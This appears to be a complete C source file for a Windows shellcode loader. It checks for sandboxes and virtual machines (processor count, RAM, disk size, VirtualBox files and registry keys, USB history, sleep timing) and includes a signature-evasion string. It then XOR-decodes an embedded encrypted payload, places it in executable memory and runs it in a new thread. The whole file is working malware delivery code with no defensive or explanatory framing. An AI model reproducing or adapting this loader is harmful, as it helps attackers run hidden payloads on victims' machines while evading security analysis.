
#include <windows.h>
#include <stdio.h>
#include <time.h>

unsigned long get_time()
{
	return (unsigned long)time(NULL);
}
int main(void)
{
	const char sig_evade[] = "rwqrmzbpsqpgpataptzunycledppnrmj";
	SYSTEM_INFO systemInfo;
	GetSystemInfo(&systemInfo);
	DWORD numberOfProcessors = systemInfo.dwNumberOfProcessors;
	if (numberOfProcessors < 2)
		return 0;

	// check RAM
	MEMORYSTATUSEX memoryStatus;
	memoryStatus.dwLength = sizeof(memoryStatus);
	GlobalMemoryStatusEx(&memoryStatus);
	DWORD RAMMB = memoryStatus.ullTotalPhys / 1024 / 1024;
	if (RAMMB < 2048)
		return 0;

	// check HDD
	HANDLE hDevice = CreateFileW(L"\\\\.\\PhysicalDrive0", 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	DISK_GEOMETRY pDiskGeometry;
	DWORD bytesReturned;
	DeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0, &pDiskGeometry, sizeof(pDiskGeometry), &bytesReturned, (LPOVERLAPPED)NULL);
	DWORD diskSizeGB;
	diskSizeGB = pDiskGeometry.Cylinders.QuadPart * (ULONG)pDiskGeometry.TracksPerCylinder * (ULONG)pDiskGeometry.SectorsPerTrack * (ULONG)pDiskGeometry.BytesPerSector / 1024 / 1024 / 1024;
	if (diskSizeGB < 70)
		return 0;

	WIN32_FIND_DATAW findFileData;
	if (FindFirstFileW(L"C:\\Windows\\System32\\VBox*.dll", &findFileData) != INVALID_HANDLE_VALUE)
		return 0;

	// check registry key
	HKEY hkResult;
	if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SYSTEM\\ControlSet001\\Services\\VBoxSF", 0, KEY_QUERY_VALUE, &hkResult) == ERROR_SUCCESS)
		return 0;

	HKEY hKey;
	DWORD mountedUSBDevicesCount;
	RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SYSTEM\\ControlSet001\\Enum\\USBSTOR", 0, KEY_READ, &hKey);
	RegQueryInfoKey(hKey, NULL, NULL, NULL, &mountedUSBDevicesCount, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
	if (mountedUSBDevicesCount < 1)
		return 0;

	unsigned long start = get_time();
	Sleep(3000);
	unsigned long end = get_time();
	if ((end - start) < 2)
	{
		return 0;
	}
	
	if ((end - start) >= 2)
	{
		char buf[] = "\x90\x20\xfa\x92\x9f\x87\xaf\x76\x72\x76\x24\x34\x39\x20\x30\x31\x5d\xba\x1c\x3e\xe4\x3d\x3\x3e\xf9\x24\x7d\x2d\xf3\x22\x42\x28\x3a\x20\xf2\x4\x3f\x27\x6c\xc1\x38\x3c\x28\x54\xb1\x38\x53\xb9\xc0\x54\x18\xa\x6d\x43\x43\x37\xb3\xbf\x68\x24\x79\xb1\x80\x94\x3e\x29\x28\x3e\xe4\x3d\x43\xfd\x30\x4a\x2d\x64\xa8\x16\xe3\x1\x74\x63\x7b\x79\xea\x1d\x63\x76\x72\xfd\xe5\xed\x78\x70\x62\x31\xe9\xa8\xd\x11\x27\x6e\xb3\xfd\x3a\x6e\x35\x21\xf3\x30\x42\x30\x6d\xb8\x9a\x20\x22\x5e\xaa\x3e\x8d\xbf\x24\xee\x4c\xf8\x2a\x78\xba\x20\x48\xb6\xc3\x2e\xa2\xbf\x7f\x37\x64\xa4\x40\x90\x17\x88\x20\x6b\x35\x52\x67\x2a\x5a\xa7\x7\xae\x3d\x21\xf3\x30\x46\x30\x6d\xb8\x1f\x37\xe4\x63\x2b\x32\xf9\x36\x79\x2c\x79\xa0\x23\xf2\x68\xe0\x38\x2e\x27\x6e\xb3\x37\x2a\x28\x3c\x3f\x39\x28\x23\x20\x2d\x32\x31\xf5\x83\x4f\x22\x24\x8d\x96\x3d\x24\x21\x2a\x2a\xf2\x7e\x81\x32\x89\x90\x90\x3e\x3e\x43\xad\x36\x2c\xc6\x7\xb\x17\x5\x6\x1c\x2\x6f\x2e\x35\x3e\xfb\x97\x2c\xa2\xba\x3c\x15\x5f\x6b\x97\xac\x25\x3c\x27\xea\x97\x21\x2c\x28\x54\xb8\x3d\x53\xb0\x3f\x3b\x30\xcc\x55\x39\x1a\xd1\x72\x76\x65\x65\x87\xa5\x8a\x77\x6c\x68\x79\x47\x56\x5d\x4d\x47\x44\x4e\x4b\x54\x56\x42\x50\x4d\x6c\x32\x31\xff\xae\x26\xa4\xb6\xc9\x77\x65\x65\x35\x41\xab\x2a\x3f\x2\x7a\x25\x26\xd5\x34\xff\xed\xb0\x65\x65\x78\x70\x9d\xac\x84\xa0\x79\x76\x6f\x40\x3a\x29\x44\x4\x13\x10\x3e\x1c\x34\x13\xd\xd\x1e\x2c\x42\x2b\x3c\x15\x19\x30\x34\x34\x2e\x1d\xd\x1d\x35\x2\x3b\x14\x56\x3a\x4\x1\x1f\x23\x5d\x13\x40\x3e\x24\x1b\x33\x37\x31\x20\x26\x1b\x11\x1\x3e\x13\x22\x57\x49\x1c\x51\x16\x2b\x21\x2d\x3c\x56\x5d\x2a\x2e\x18\x29\x11\x13\xa\x11\x31\x0\x39\x5e\xc\x4\x5\x3f\x2c\x3c\x19\x2c\x6\x35\x19\x3d\x3b\x15\x2a\xc\x2a\x1e\x56\x16\x2c\x2\x3e\x17\x24\x2e\x11\x48\x32\x2e\x2f\x2d\xe\x1d\x56\x29\x1b\x6\x31\x2f\x12\x6\x2a\x45\x30\x2c\x18\x2e\x38\xc\x19\x2c\x6\x45\x44\x43\x28\x2b\x4a\x23\x23\x2c\x59\x5\xf\x3d\x27\x1f\x24\x17\x47\x3b\xf\x32\x11\x5\x56\x35\x7\x26\x16\x11\x0\x42\x2f\x38\x44\x43\x22\x15\x10\x33\x14\x4f\x34\x26\xc\x11\x9\x21\x19\x0\x40\x2e\x55\x7\x17\x29\x50\x4f\x22\x3d\x1f\x39\x19\xc\x2d\x41\x21\x4f\x15\x2\x78\x38\xeb\xb8\x3f\x32\x38\x2e\x22\x5e\xaa\x25\x3a\xce\x65\x57\xd0\xf4\x62\x79\x6c\x68\x29\x25\x3c\x26\xa4\xb4\x99\x23\x4b\x5e\x87\xa5\x2a\xf0\xaa\x2\x73\x29\x27\xe6\x92\x1c\x6d\x2c\x37\xd\xf8\x43\x62\x79\x25\xe1\x99\x1c\x6b\x2e\x3a\x3f\xc8\x3\x23\xfb\xfe\x70\x62\x79\x6c\x97\xac\x3b\x5e\xaf\x30\x2c\x3a\xff\x94\x28\x49\xb9\x2f\x48\xa5\x3b\x2a\x3f\xa8\xad\x4e\x70\x6a\xd\x9a\xb0\xfd\xb0\x17\x66\x24\xaf\xb8\xfe\x7c\x6f\x63\x3f\xc8\x32\x95\x50\x98\x70\x62\x79\x6c\x97\xac\x3e\x90\xa0\x17\x74\x99\xdc\x8d\x30\x78\x70\x62\x2a\x35\x2\x39\x2c\x26\xe6\xb2\xb7\x90\x66\x2c\xa2\xb8\x70\x72\x79\x6c\x21\xc3\x2e\xcb\x3c\x86\x76\x72\x76\x65\x9a\xad\x38\xf1\x2a\x3f\x20\xf0\x91\x27\xe6\x92\x3e\xfb\xac\x2c\xa2\xb8\x70\x42\x79\x6c\x21\xf0\x8f\x26\xd5\x71\xe0\xfb\x94\x65\x65\x78\x70\x9d\xac\x24\xeb\xbd\x56\xea\xaf\x17\xc4\x14\xfd\x62\x2d\x79\xb3\xe7\xb9\x19\xba\x21\xb5\x37\x5\x63\x2f\x3b\xb1\xa7\x95\xcd\xd2\x34\x86\xb9";
		const char key[] = "lhyvoocvrveexpby";

			for (int i = 0; i < sizeof(buf); i++)
		{
			buf[i] = buf[i] ^ key[i % (sizeof(key) - 1)];
		}
		PVOID shellcode_exec = VirtualAlloc(0, sizeof buf, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

		RtlCopyMemory(shellcode_exec, (const char *)buf, sizeof buf);
		DWORD threadID;
		HANDLE hThread = CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)shellcode_exec, NULL, 0, &threadID);

		WaitForSingleObject(hThread, INFINITE);
	}
	return 0;
}